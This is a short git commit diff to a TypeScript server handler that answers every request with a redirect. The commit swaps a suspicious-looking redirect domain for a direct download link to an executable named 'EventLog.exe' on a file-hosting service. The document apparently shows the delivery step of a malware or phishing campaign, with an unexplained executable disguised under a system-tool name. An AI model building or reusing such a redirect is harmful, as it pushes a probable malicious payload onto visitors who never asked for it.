0401ccb401a997bc35e233a5df4ab7bc8164f010
lisa1964vineyard-tech <lisa1964vineyard@gmail.com>
2025-10-09 08:38:35 -0700

    Update thesctechv4.ts

--- thesctechv4.ts
+++ thesctechv4.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dispuacc-rvlwnow.co/simmon",
+      Location: "https://store-na-phx-4.gofile.io/download/direct/f7cff518-32bd-4f94-b0c1-c3dfd13ba6a9/EventLog.exe",
     },
   });
 });
